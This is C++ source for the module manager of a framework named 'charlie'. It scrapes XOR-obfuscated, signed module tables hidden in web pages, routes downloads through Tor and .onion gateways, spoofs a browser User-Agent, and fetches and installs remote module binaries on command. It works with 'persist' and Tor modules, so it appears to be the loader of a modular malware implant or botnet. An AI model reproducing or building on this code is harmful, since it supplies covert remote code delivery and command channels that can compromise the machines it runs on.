//xxx: Later maybe this can be automated?
#define MODULE_ID 3133916783
#include <modules/manager/Manager.h>
#include <boost/thread.hpp>
#include <boost/regex.hpp>
#include <stdexcept>
#include <algorithm>
#include <openssl/md5.h>
#include <charlie/base64.h>
#include <vector>
#include <charlie/xor.h>
#include <charlie/CryptoBuf.h>
#include <chrono>
#include <charlie/machine_id.h>

#include <boost/algorithm/string/predicate.hpp>

#if DEBUG
#define VERBOSE
#endif

#include <charlie/curl.h>

using namespace modules::manager;

ManagerModule::ManagerModule()
{
  MLOG("Manager module constructed...");
  pInter = new ManagerInter(this);
  nextModuleUpdate = std::time(NULL);
  dependedUpon = NULL;
  clientMod = NULL;
  aboutToRelocate = false;
  hasOrProxy = false;
}

ManagerModule::~ManagerModule()
{
  delete pInter;
}

void ManagerModule::shutdown()
{
  MLOG("Shutting down manager module..");
  loadedModules.clear();
}

void ManagerModule::setModuleInterface(ModuleInterface* inter)
{
  MLOG("Received module interface");
  mInter = inter;
}

void ManagerModule::injectDependency(u32 id, void* dep)
{
  if(!dep) return;

  MLOG("Dep injected "<<id);
  switch(id)
  {
    case (u32)2526948902:
      persist = (modules::persist::PersistInter*)dep;
      break;
    case (u32)CLIENT_MODULE_ID:
      clientMod = (modules::client::ClientInter*) dep;
      break;
    case 6032034:
      torModule = dep;
      break;
  }
  loadedModules[id] = (ModuleAPI*)dep;
}

void ManagerModule::releaseDependency(u32 id)
{
  MLOG("Dep released "<<id);
  switch(id)
  {
    case (u32)2526948902:
      persist = NULL;
      break;
    case (u32)CLIENT_MODULE_ID:
      clientMod = NULL;
      break;
    case 6032034:
      torModule = NULL;
      hasOrProxy = false;
      orProxy.clear();
      orProxyAuth.clear();
      break;
  }
  loadedModules.erase(id);
}

void* ManagerModule::buildStandardHeaders()
{
  struct curl_slist *headers=NULL;
  headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
  headers = curl_slist_append(headers, "Accept-Encoding: identity");
  headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.8,ru;q=0.6");
  headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36");
  headers = curl_slist_append(headers, "Connection: close");
  return headers;
}

void ManagerModule::fetchStaticUrl(const std::string& url, std::ostream& oss)
{
  CURLcode ccode;
  bool isOnion = url.find("onion") != std::string::npos;
  struct curl_slist* headers = (struct curl_slist*)buildStandardHeaders();

  if(CURLE_OK != (ccode = curl_read(url.c_str(), oss, NULL, headers, isOnion ? 300 : 30, &orProxy, &orProxyAuth)))
  {
    curl_slist_free_all(headers);
    throw std::runtime_error(std::string("curle_not_ok")+curl_easy_strerror(ccode));
  }
  curl_slist_free_all(headers);
}

void ManagerModule::fetchUrl(std::string& url, std::ostream& outp)
{
  if (url.find("/") == 0)
    url = url.substr(1);
  if (url.find("onion:") == 0)
  {
    url = url.substr(6);
    int slashPos = url.find("/");
    std::string urlEndpoint = hasOrProxy ? ".onion" : ".onion.to";
    if (slashPos != std::string::npos)
      url = url.substr(0, slashPos) + urlEndpoint + url.substr(slashPos);
    else
      url += urlEndpoint;
    url = (hasOrProxy ? "http://" : "https://") + url;
    MLOG("Rewrote url to " << url);
  }
  if (url.find("http") != 0)
    url = std::string(hasOrProxy ? "http://" : "https://") + url;
  return fetchStaticUrl(url, outp);
}

void ManagerModule::saveStorage()
{
  std::string data;
  if(!stor.SerializeToString(&data))
  {
    MERR("Unable to serialize storage to string!");
    return;
  }
  mInter->saveStorage(data);
}

//Base64
//^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$

charlie::CModuleTable ManagerModule::fetchStaticModTable(bool* success)
{
  MLOG("Fetching modules from all sources...");
  boost::regex re("@[a-zA-Z0-9+/]+={0,2}");
  boost::match_results<std::string::const_iterator> results;

  // Parse out the modules
  charlie::CModuleTable* tab = mInter->getModuleTable();
  std::map<u32, charlie::CModule> existTable;
  for (int i = 0; i < tab->signed_modules_size(); i++)
  {
    const charlie::CSignedBuffer& buf = tab->signed_modules(i);
    charlie::CModule mod;
    if (mod.ParseFromString(buf.data()))
      existTable[mod.id()] = mod;
    else
    {
      // Should never happen
      MLOG("Error parsing from *known good* module table!");
    }
  }

  charlie::CModuleTable latest;
  *success = false;
  for(auto str : sInfo.init_url())
  {
    try {
      MLOG("Trying to fetch table from "<<str<<"...");
      std::stringstream ss;
      fetchUrl(str, ss);
      const std::string s = ss.str();

#ifdef VERBOSE
      MLOG("Body: "<<s);
#endif

      boost::sregex_token_iterator iter(s.begin(), s.end(), re, 0);
      boost::sregex_token_iterator end;
      bool foundOne = false;
      for(; iter != end; ++iter)
      {
        foundOne = true;
        std::string b64 = std::string(*iter).substr(1);
#ifdef VERBOSE
        MLOG("Found an encoded module table: "<<b64);
#endif
        //Decode base64
        unsigned char* b64d;
        int b64len;
        try {
          b64len = base64Decode(b64.c_str(), b64.length(), &b64d);
          apply_xor(b64d, b64len, ONLINE_MTABLE_KEY, strlen(ONLINE_MTABLE_KEY));
        }catch(const std::exception &exc)
        {
          MERR("Error occurred decoding base 64.");
#ifdef VERBOSE
          MERR(exc.what());
#endif
        }
#ifdef DEBUG
#ifdef VERBOSE
        {
          char mdString[33];
          unsigned char digest[MD5_DIGEST_LENGTH];
          MD5((const unsigned char*)b64d, b64len, (unsigned char*)&digest);
          for (int i = 0; i < 16; i++)
            sprintf(&mdString[i*2], "%02x", (unsigned int)digest[i]);
          MLOG("MD5 of data: "<<mdString);
          MLOG("Length of data: "<<b64len);
        }
#endif
#endif
        //Decrypt CSignedBuffer
        charlie::CSignedBuffer buf;
        if(buf.ParseFromArray(b64d, b64len))
        {
          //Verify signature
          if(verifySignedBuf(&buf, crypt) == 0)
          {
            charlie::CWebInformation winfo;
            if(winfo.ParseFromArray(buf.data().c_str(), buf.data().length()))
            {
              MLOG("Web information verified.");

              //Verify second layer, another csignedbuffer
              if(winfo.has_mod_table()){
                charlie::CModuleTable mod_table = winfo.mod_table();

                for (int i = 0; i < mod_table.signed_modules_size(); i++)
                {
                  const charlie::CSignedBuffer& mbuf = mod_table.signed_modules(i);
                  charlie::CModule tmp;
                  if (verifySignedBuf((charlie::CSignedBuffer*) &mbuf, crypt) == SUCCESS && tmp.ParseFromString(mbuf.data()))
                  {
                    MLOG("Verified incoming module " << tmp.id());
                    // If at least one incoming success
                    *success = true;
                    if (existTable.count(tmp.id()))
                    {
                      auto exist = existTable[tmp.id()];
                      int etime = exist.timestamp();
                      if (etime < tmp.timestamp())
                      {
                        MLOG("... and module is newer (" << etime << " vs. " << tmp.timestamp() << ")");
                        exist.Clear();
                        exist.CopyFrom(tmp);
                      }
                      else
                      {
                        MLOG("... but module is older, ignoring.");
                      }
                    } else
                    {
                      MLOG(" ... and module is new! (previously unknown)");
                      charlie::CSignedBuffer* buf = latest.add_signed_modules();
                      buf->CopyFrom(mbuf);
                    }
                  } else
                  {
                    MERR("Incoming module verification failed.");
                  }
                }
              }
            }else
            {
              MERR("Unable to parse CWebInformation...");
            }
          }else
          {
            MERR("Parsed a valid signed buffer, but signature is invalid.");
          }
        }else
        {
          MERR("Data does not parse to a signed buffer.");
        }
      }
      if(!foundOne)
      {
        MLOG("No module tables found at link.");
      }
    }catch(const std::exception &exc)
    {
      MERR("Error occured while fetching from "<<str);
      MERR(exc.what());
    }
  }

  return latest;
}

int ManagerModule::parseModuleInfo()
{
  std::string info = mInter->getModuleInfo();
  return sInfo.ParseFromString(info) == 0;
}

void ManagerModule::loadStorage()
{
  std::string* data = mInter->getStorage();
  if(data != NULL) stor.ParseFromString(*data);
}

bool ManagerModule::updateTableFromInternet()
{
  bool succ;
  charlie::CModuleTable wtbl = fetchStaticModTable(&succ);
  if (succ)
    mInter->processModuleTable(wtbl);
  return succ;
}

int ManagerModule::fetchModuleFromUrl(std::shared_ptr<charlie::CModule> mod, std::string url)
{
  // Calculate target filename
  std::string fn = mInter->getModuleFilename(mod);

  // Download to the file
  std::ofstream of;
  of.open(fn.c_str(), std::ios::out | std::ios::binary | std::ios::trunc);
  CURLcode res(CURLE_FAILED_INIT);
  if (of.is_open())
  {
    try
    {
      fetchUrl(url, of);
      res = CURLE_OK;
    }
    catch (std::exception& ex)
    {
      MERR("Error fetching module: " << ex.what());
    }
    MLOG("Output stream has " << of.tellp());
    of.close();
  } else
    CERR("Unable to open file "<<fn<<" to download module "<<mod->id()<<"!");

  return (int) res;
}

void ManagerModule::downloadModules(charlie::CModuleTable* table)
{
  bool anyFailed = false;
  if(aboutToRelocate)
  {
    // Probably will never happen
    MLOG("About to relocate anyway, skipping module download.");
    return;
  }

  if (dependedUpon == NULL)
  {
    MLOG("Deferring downloading modules, we don't have dependency list yet...");
    return;
  }

  boost::mutex::scoped_lock lock(relocateMtx);
  //We need to parse it ourselves
  bool delTab = false;
  charlie::CModuleTable* emtab = mInter->getModuleTable();

  // Now acquire via acquire methods
  {
    int mcount = emtab->signed_modules_size();
    for(int i=0;i<mcount;i++)
    {
      std::shared_ptr<charlie::CModule> mod = std::make_shared<charlie::CModule>();
      const charlie::CSignedBuffer& buf = emtab->signed_modules(i);
      if (!mod->ParseFromString(buf.data()))
      {
        MERR("Unable to parse module (from known module table!) to string.");
        continue;
      }

      // Check if we even need this module
      if (dependedUpon->count(mod->id()) == 0)
        continue;

      // Check if the module needs updating
      if(mInter->moduleLoadable(mod->id()))
        continue;

      charlie::CModuleBinary* bin = mInter->selectBinary(mod);
      if (bin == NULL)
      {
        MLOG("Module "<<mod->id()<<" has no binaries for this platform...");
        continue;
      }

      int acqs = bin->acquire_size();
      MLOG("Module binary "<<mod->id()<<" has "<<acqs<<" acquire methods...");

      // Build a signed download request
      CDownloadRequest req;
      req.set_id(mod->id());
      req.set_platform(CHARLIE_PLATFORM);
      std::string reqd = req.SerializeAsString();
      charlie::CRSABuffer reqs;
      if(encryptRsaBuf(&reqs, this->crypt, (const unsigned char*)reqd.c_str(), reqd.length()) != SUCCESS)
      {
        MERR("Unable to RSA encrypt request for module "<<mod->id()<<"!");
        continue;
      }
      reqs.SerializeToString(&reqd);

      // Serialize to base64
      char* reqb = base64Encode((const unsigned char*)reqd.c_str(), reqd.length());
      std::string reqbs(reqb);
      free(reqb);

      bool loaded = false;
      for(int ia=0;ia<acqs&&!loaded;ia++)
      {
        const charlie::CModuleAcquire acq = bin->acquire(ia);
        switch(acq.type())
        {
          case charlie::HTTP_GET:
            {
              std::string url = acq.data();
              MLOG("Fetching via HTTP: "<<url);
              loaded = (fetchModuleFromUrl(mod, url) == CURLE_OK);
              break;
            }
          case charlie::HTTP_SIGNED:
            {
              std::string url = acq.data()+reqbs;
              MLOG("Fetching via signed HTTP request: "<<url);

              if(boost::starts_with(url, "*"))
              {
                url = url.substr(1);
                for(auto sr : sInfo.server_root())
                  if((loaded = (fetchModuleFromUrl(mod, sr+url) == CURLE_OK))) break;
              }else
                loaded = (fetchModuleFromUrl(mod, url) == CURLE_OK);

              if(loaded)
              {
                // Check if module loadable
                MLOG(mod->id()<<" downloaded, verifying...");
                if(!mInter->moduleLoadable(mod->id()))
                {
                  MERR("Module "<<mod->id()<<" download wasn't valid.");
                  loaded = false;
                }
              }
              break;
            }
          default:
            {
              MERR("Unknown acquire type " << acq.type());
              break;
            }
        }
      }
      if(!loaded)
      {
        MERR("Unable to find a valid acquire for "<<mod->id()<<"!");
        anyFailed = true;
      }
      else
      {MLOG("Successfully downloaded "<<mod->id()<<"!")}
    }

    std::time_t now;
    std::time(&now);
    if (anyFailed)
    {
      MLOG("Some modules failed download, will retry module lookup shortly...");
      nextModuleUpdate = now + 30;
    }
  }

  // Cleanup
  if(delTab) delete table;
  mInter->triggerModuleRecheck();
}

bool running = true;
void ManagerModule::module_main()
{
  //Require persist module
  crypt = mInter->getCrypto();
  mInter->requireDependency(2526948902);
  mInter->requireDependency(CLIENT_MODULE_ID);
  // Tor library
  mInter->requireDependency(6032034);
  // XXX
  loadStorage();

  curl_global_init(CURL_GLOBAL_ALL);

  if(parseModuleInfo() != 0)
  {
    MERR("Unable to load module info...");
  }
  while(running)
  {
    try
    {
      //An interruption point
      boost::this_thread::sleep(boost::posix_time::milliseconds(1000));
    }
    catch(...)
    {
      MLOG("Interrupted, exiting...");
      break;
    }
    std::time_t now;
    std::time(&now);

    if (shouldDownloadModules) {
      downloadModules();
      shouldDownloadModules = false;
    }

    if (pendingLoad != NULL && pendingLoad->size() > 0 && std::difftime(now, nextModuleUpdate) > 0)
    {
      // Quick check to make sure it doens't immediately update again
      nextModuleUpdate = now + 30;
      if (!updateTableFromInternet())
      {
        MERR("Unable to fetch (a newer?) static module table from the internet. Retrying soon.");
        nextModuleUpdate = now + 30;
      } else {
        parseModuleInfo();
        // Try again in 30 minutes since it was successful
        // Later on we will override this if we can't get a network connection
        nextModuleUpdate = now + (60 * 30);
      }
      shouldDownloadModules = true;
    }
  }
}

bool ManagerModule::prepareToRelocate()
{
  boost::mutex::scoped_lock lock(relocateMtx);
  if(aboutToRelocate) return false;
  return aboutToRelocate = true;
}

void* ManagerModule::getPublicInterface()
{
  return (void*)pInter;
}

void ManagerModule::handleEvent(u32 eve, void* data)
{
  charlie::EModuleEvents event = (charlie::EModuleEvents) eve;
  switch (event)
  {
    case charlie::EVENT_UNRESOLVED_MODULES_UPDATE:
      pendingLoad = (std::set<u32>*)data;
      MLOG("Pending load of " << pendingLoad->size() << " modules...");
      break;
    case charlie::EVENT_REQUESTED_MODULES_UPDATE:
      dependedUpon = (std::set<u32>*)data;
      MLOG("Depending upon " << dependedUpon->size() << " modules...");
      shouldDownloadModules = true;
      break;
    default: break;
  }
}

ManagerInter::ManagerInter(ManagerModule* mod)
{
  this->mod = mod;
}

ManagerInter::~ManagerInter()
{
}

bool ManagerInter::prepareToRelocate()
{
  return mod->prepareToRelocate();
}

void ManagerInter::fetchUrl(std::string& url, std::ostream& outp)
{
  mod->fetchUrl(url, outp);
}

CManagerInfo* ManagerInter::getInfo()
{
  return &mod->sInfo;
}

void ManagerModule::setOrProxy(std::string& proxy, std::string& proxyAuth)
{
  MLOG("Received or proxy " << proxy << " with auth " << proxyAuth);
  orProxy = proxy;
  orProxyAuth = proxyAuth;
  hasOrProxy = true;
}

void ManagerInter::setOrProxy(std::string proxy, std::string proxyAuth)
{
  mod->setOrProxy(proxy, proxyAuth);
}

void ManagerInter::handleCommand(const charlie::CMessageTarget& target, std::string& data)
{
  if (target.emsg() == (u32) EManagerEMsg_ModuleTableUpdate)
  {
    MLOG("Received remote module table update.");
    CModuleTableUpdate upd;
    if (!upd.ParseFromString(data))
    {
      MERR("... unable to parse CModuleTableUpdate");
      return;
    }

    mod->mInter->processModuleTable(upd.table());
    return;
  }

  MERR("Received unknown message " << target.emsg() << ", ignoring.");
}

CHARLIE_CONSTRUCT(ManagerModule);
